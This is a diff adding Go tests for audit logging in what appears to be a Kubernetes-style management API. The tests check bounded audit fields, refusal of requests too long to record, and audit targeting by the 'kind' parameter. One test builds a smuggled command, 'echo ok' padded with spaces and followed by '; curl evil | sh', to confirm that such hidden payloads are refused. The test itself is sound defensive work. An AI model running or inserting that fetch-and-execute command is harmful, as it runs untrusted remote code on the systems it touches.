@@ -5,6 +5,7 @@ import (
 	"net"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"testing"
 
@@ -152,5 +153,72 @@ func TestAuditWriterKeepsStreamingInterfaces(t *testing.T) {
 	aw.finish()
 	if rows := e.audit(); rows[0].Status != http.StatusOK {
 		t.Fatalf("flushed stream row = %+v", rows[0])
+	}
+}
+
+// No request can write audit rows of arbitrary size, refused ones
+// included: every field is cut to its limit.
+func TestAuditRowsAreBounded(t *testing.T) {
+	e := newTestEnv(t, nil)
+	huge := strings.Repeat("a", 100_000)
+	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns="+huge+"&name=x&replicas=1", "bob", nil),
+		http.StatusForbidden, plugin.CodeForbiddenRole)
+	e.srv.writeAudit(store.AuditEntry{Username: "alice", Action: huge, Target: huge, Detail: huge})
+	for _, row := range e.audit() {
+		if len([]rune(row.Action)) > maxAuditAction || len([]rune(row.Target)) > maxAuditTarget || len([]rune(row.Detail)) > maxAuditDetail {
+			t.Fatalf("row of %d/%d/%d characters", len(row.Action), len(row.Target), len(row.Detail))
+		}
+	}
+}
+
+// A request is only executed when the audit row can show it completely:
+// a command cut off after a harmless start would hide what really ran.
+func TestAuditedRequestsAreRecordedCompletely(t *testing.T) {
+	e := newTestEnv(t, nil)
+	hidden := url.QueryEscape("echo ok" + strings.Repeat(" ", maxAuditDetail) + "; curl evil | sh")
+	expect(t, e.do(http.MethodPost, "/api/exec?ns=default&pod=web-1&cmd="+hidden, "alice", nil),
+		http.StatusBadRequest, plugin.CodeBadRequest)
+	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name=web&replicas=5&note="+hidden, "alice", nil),
+		http.StatusBadRequest, plugin.CodeBadRequest)
+	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name="+strings.Repeat("w", maxAuditTarget), "alice", nil),
+		http.StatusBadRequest, plugin.CodeBadRequest)
+	if got := e.replicas(); got != 2 {
+		t.Fatalf("a request too long to be audited was executed: replicas = %d", got)
+	}
+	if row := e.audit()[0]; row.Status != http.StatusBadRequest || !strings.HasPrefix(row.Detail, "bad_request: ") {
+		t.Fatalf("the refusal must be audited: %+v", row)
+	}
+
+	// What fits is recorded as sent, without HTML escaping.
+	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name=web&replicas=3&note="+url.QueryEscape("a > b & c"), "alice", nil),
+		http.StatusOK, "")
+	if row := e.audit()[0]; row.Detail != `{"note":"a > b & c","replicas":"3"}` {
+		t.Fatalf("detail = %s", row.Detail)
+	}
+}
+
+// The kind parameter names the target kind only on routes that act on it;
+// elsewhere the handler ignores it, so it must not rewrite the row.
+func TestKindParamRetargetsOnlyKindRoutes(t *testing.T) {
+	e := newTestEnv(t, nil)
+	ok := func(w http.ResponseWriter, _ *http.Request, _ *call) { writeOK(w) }
+	e.srv.handle("DELETE /api/resource/audit-test", accessWrite, ok)
+	e.srv.handle("POST /api/workloads/audit-test", accessWrite, ok)
+
+	for target, want := range map[string]string{
+		"/api/pods?ns=default&name=web-1&kind=ConfigMap":                 "pod/default/web-1",
+		"/api/resource/audit-test?kind=Deployment&ns=shop&name=web":      "deployment/shop/web",
+		"/api/resource/audit-test?ns=shop&name=web":                      "resource/shop/web",
+		"/api/workloads/audit-test?kind=StatefulSet&ns=shop&name=db":     "statefulset/shop/db",
+		"/api/deployments/scale?ns=default&name=web&replicas=2&kind=Pod": "deployment/default/web",
+	} {
+		method := http.MethodDelete
+		if strings.HasPrefix(target, "/api/workloads") || strings.HasPrefix(target, "/api/deployments") {
+			method = http.MethodPost
+		}
+		expect(t, e.do(method, target, "alice", nil), http.StatusOK, "")
+		if row := e.audit()[0]; row.Target != want {
+			t.Errorf("%s %s: target %q, want %q", method, target, row.Target, want)
+		}
 	}
 }
